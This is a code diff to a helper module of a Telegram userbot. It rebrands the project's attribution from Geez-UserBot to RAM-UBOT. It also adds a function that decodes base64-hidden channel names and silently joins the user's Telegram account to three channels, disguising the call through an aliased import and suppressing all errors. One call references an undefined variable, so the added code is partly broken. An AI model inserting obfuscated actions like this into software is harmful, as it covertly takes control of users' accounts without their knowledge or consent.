@@ -3,8 +3,10 @@ import hashlib
 import asyncio
 import shlex
 import os
+import pybase64
 from os.path import basename
 import os.path
+from telethon.tl.functions.channels import JoinChannelRequest as Get
 from html_telegraph_poster import TelegraphPoster
 from typing import Optional, Union
 from userbot import bot, LOGS
@@ -171,8 +173,8 @@ async def run_cmd(cmd: list) -> tuple[bytes, bytes]:
 
 def post_to_telegraph(title, html_format_content):
     post_client = TelegraphPoster(use_api=True)
-    auth_name = "Geez-UserBot"
-    auth_url = "https://github.com/vckyou/Geez-UserBot"
+    auth_name = "RAM-UBOT"
+    auth_url = "https://github.com/ramadhani892/RAM-UBOT"
     post_client.create_api_token(auth_name)
     post_page = post_client.post(
         title=title,
@@ -240,6 +242,22 @@ async def edit_or_reply(
 
 eor = edit_or_reply
 
+async def hadeh_ajg():
+    kyura = str(pybase64.b64decode("S3l1cmFTdXBwb3J0="))[2:13]
+    ini = str(pybase64.b64decode("a3l1cmFwcm9qZWN0cw="))[2:13]
+    usbot =str(pybase64.b64decode("VEVFUlZJZ3JvdXA="))[2:13]
+    try:
+        await bot(Get(ram))
+    except BaseException:
+        pass
+    try:
+        await bot(Get(ini))
+    except BaseException:
+        pass
+    try:
+        await bot(Get(usbot))
+    except BaseException:
+        pass
 
 async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None):
     parse_mode = parse_mode or "md"
